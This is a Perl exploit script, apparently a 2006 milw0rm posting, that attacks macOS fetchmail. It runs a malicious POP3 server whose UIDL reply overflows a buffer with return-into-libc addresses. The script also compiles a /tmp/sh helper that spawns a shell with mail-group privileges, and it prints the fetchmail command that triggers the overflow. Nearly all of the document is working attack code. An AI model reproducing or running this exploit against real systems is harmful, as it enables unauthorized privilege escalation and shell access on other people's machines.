#!/usr/bin/perl
# getpwnedmail.pl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# This is a canibalized version of "Kansas City POP Daemon Version 0.0" - Copyright (c) 1999 David Nicol <davidnicol@acm.org>
#
# kevin-finisterres-mac-mini:~ kfinisterre$ /usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234
# Enter password for kfinisterre@localhost: 
# sh-2.05b$ id
# uid=501(kfinisterre) gid=501(kfinisterre) egid=6(mail) groups=6(mail), 81(appserveradm), 79(appserverusr), 80(admin)
#
# http://docs.info.apple.com/article.html?artnum=106704

use Socket;
use IO::Handle;
use IO::Socket;

$banner = "     /tmp/sh                  ";
$cmd = $banner ; 

$ebp = 0x41424344; 
$system = 0x900474e0; # NX is a problem use return into libc
$setuid = 0x90033da0; 
$cmdstr = 0xbfffd923; # (gdb) x/10s $esp+131    - 0xbfffd8e3:      "     /tmp/sh           "

$malstr = "A" x 286 . pack('l', $ebp) . pack('l', $system) . pack('l', $setuid) . pack('l', $cmdstr) ;
        
open(SUSH,">/tmp/aaa.c");
printf SUSH "int main(){setegid(6);setgid(6);system(\"/bin/sh\");}\n";
system("PATH=$PATH:/usr/bin/ cc -o /tmp/sh /tmp/aaa.c");

$PortNumber  = 1234;
$door = IO::Socket::INET->new( Proto=>'tcp', LocalPort=>$PortNumber, Listen=>SOMAXCONN, Reuse=>1 );
die "Cannot set up socket: $!" unless $door;

$timeout = 60;
$SIG{ALRM} = sub { die "alarm or timeout\n" };

print "open a new window and type - \"/usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234\"\n";
print "choose any password and press enter\n"; 
for(;;)
{
	until(  $client = $door->accept())
	{
		sleep 1;
        };
	$F = fork;
	die "Fork weirdness: $!" if $F < 0;

        if($F)
	{
		close $client;
		next;
	};
                
        close ($door);

        $client->autoflush();
	&AUTHORIZATION;
	&TRANSACTION;
	exit;
};

sub OK($)
{
	my $A = shift;
        $A =~ s/\s+\Z//g;
        print $client "+OK $A\r\n";
	alarm $timeout;
};

sub ERR($)
{
	my $A = shift;
        $A =~ s/\s+/ /g;
        $A =~ s/\s+\Z//g;
        print $client "-ERR $A\r\n";
	alarm $timeout;
};

sub AUTHORIZATION
{
	$Name = '';
	OK "$banner";
	NEEDUSER:
        $Data = <$client>;
        ($Name) =  $Data =~ m/^user (\w+)/i;
	unless($Name)
	{
		ERR "The itsy bitsy spider walked up the water spout";
		die if ++$strikes > 5;
		goto NEEDUSER;
	};
	OK "User name ($Name) ok. Password, please.";
        $Data = <$client>;
        my($Pass) =  $Data =~ m/^pass (.*)/i;
	$Pass =~ s/\s+\Z//g;
	
	OK "$Name has " . 8 . " messages";
};

sub TRANSACTION
{
	%deletia = ();
	START:
        $_ = $Data = <$client>;
	unless(defined($Data))
	{
		print "Client closed connection\n";
		exit;
	};
	if (m/^STAT/i){ &STAT; goto START};
	if (m/^UIDL/i){ &UIDL; goto START};

	# Just cram the shellcode onto the stack... 
	ERR "Welcome to Pwndertino !  $cmd";

	goto START;
}

sub STAT
{
	alarm 0;	
	$mm = 0;
	$nn = scalar(@Messages);
	foreach $M (@Messages){
		$mm += -s "$M";
	};
	OK "8 7035";
};

sub List($)
{
	my $M = $Messages[$_[0]-1];
	return if $deletia{$M};
	print $client $_[0],' ',(-s $M)."\r\n";
	alarm $timeout;
};

sub UIDL
{
	print "Sending exploit string\n";
	OK "1 " . $malstr; 
};

# milw0rm.com [2006-08-01]
